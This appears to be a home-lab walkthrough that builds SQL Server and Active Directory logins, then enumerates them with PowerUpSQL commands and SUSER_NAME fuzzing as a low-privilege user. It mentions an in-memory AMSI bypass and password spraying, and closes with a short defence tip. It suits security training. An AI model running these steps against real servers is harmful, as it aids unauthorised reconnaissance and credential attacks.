# Enumerate Logins

## Configuring

### Adding SQL Server logings

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
2. Open "Microsoft SQL Server Management Studio".

![](<../../../../../.gitbook/assets/image (44) (1) (1).png>)

3\. Login with the `Administrator` user using Windows Authentication.

![](<../../../../../.gitbook/assets/image (39) (1) (1) (1) (1).png>)

4\. Create two new users copying the following settings. Unfold "Security" and "Logins" folders and right clicking on "Logins" and selecting "New Login".

Username: `Bob`, Password: `Bob`

![](<../../../../../.gitbook/assets/image (23) (1) (1) (1).png>)

Click "OK" and create the second user: Username: `SQLAdmin`, Password `Winter2022!`.

![](<../../../../../.gitbook/assets/image (25) (1).png>)

Then open the tab "Server Roles" and select "sysadmin" so the user `SQLAdmin` is sysadmin.

### Creating Domain Group and User to access the SQL Server.

1. The user AMSTERDAM\Richard already has access to the SQL Server. But lets create a group and a new user and add this user to the group and give it access.
2. Open the "Active Directory Users and Computers" administration tool on `DC02`.

![](<../../../../../.gitbook/assets/image (10) (1).png>)

3\. Open the "Employees" OU and right click on it and select "new" and then "Group". Name the group `DatabaseUsers`.

![](<../../../../../.gitbook/assets/image (41) (1).png>)

4\. Right click on the "Employees" OU and select "new" and then "User". Name the user also `Bob` and set the password `Fall2022!`. Make sure you deselect "User must change password at next Logon".

![](<../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png>)

5\. Right click the user "Bob" and select "Properties". Then open the tab "Member Of" and click "Add". Fill in the group `DatabaseUsers` and click on "OK"

![](<../../../../../.gitbook/assets/image (37) (1) (1).png>)

6\. Go back to `WEB01` and unfold "Security" and "Logins" folders and right clicking on "Logins" and selecting "New Login". Fill in Amsterdam\DatabaseUsers

![](<../../../../../.gitbook/assets/image (70) (1) (1) (1) (1) (1).png>)

## Attacking

### How it works

SQL Servers can have two type of accounts that could connect to it. Domain user accounts or groups or SQL Server accounts. These accounts can be enumerated by any user with the "Public" role. By enumerating the SQL / Domain users and groups that have access to the SQL server, it might be possible to obtain access with a account that has higher privileges by for example password spraying all these users. Which might result in code execution on the SQL Server.

### Tools

* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

### Executing the attack

1. Login to `WS01` as `Richard` with the password `Sample123`.
2. Download PowerUpSQL on the kali machine and host it on a webserver:

```
wget https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
python3 -m http.server 8090
```

3\. Start PowerShell and download and execute an amsi and PowerUpSQL in memory:

![](<../../../../../.gitbook/assets/image (31) (1) (1) (1) (1).png>)

4\. With PowerUPSQL loaded and the knowledge that Richard already has access to the SQL Server. We can enumerate the logins manually but since we aren't sysadmin it wont return all the users, only the one we can see from the database we have access to;

```
Get-SQLInstanceDomain | Get-SQLQuery -Query "SELECT name FROM sys.syslogins
Get-SQLInstanceDomain | Get-SQLQuery -Query "SELECT name FROM sys.server_principals"
```

![](<../../../../../.gitbook/assets/image (66) (1) (1) (1) (1).png>)

5\. If we run the queries on the SQL server itself as the Domain Admin we will receive all the users, since it is sysadmin on the SQL Server;

![](<../../../../../.gitbook/assets/image (5) (1) (1) (1).png>)

6\. So we aren't able to enumerate all the users using these queries. But we are able to query the users with the following query; `Select SUSER_NAME(ID)`. Using the SUSER\_NAME function. Where the ID starts with 1 and we keep incrementing it till we have all the users. The id `282` is from the `testadmin` SQL user.

![](<../../../../../.gitbook/assets/image (40) (1) (1) (1).png>)

7\. Doing this manually takes a while so luckely the authors of PowerUpSQL automated this by using the `Get-SQLFuzzServerLogin` cmdlet;

```
Get-SQLFuzzServerLogin -Instance web01
```

![](<../../../../../.gitbook/assets/image (59) (1) (1) (1) (1).png>)

8\. We discovered that the following user/groups can access the SQL Server. The users/groups with `AMSTERDAM\` or `BANK\` are domain users/groups.

```
AMSTERDAM\richard
Developer
Developer_test
BANK\administrator
testadmin
bob
SQLAdmin
AMSTERDAM\DatabaseUsers
```

## Defending

### Recommendations

* Restrict access to SQL Servers as much as possible. There is no need to give all "Domain Users" public access to the SQL Database.

### Detection



## References

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts" %}

{% embed url="https://github.com/NetSPI/PowerUpSQL" %}
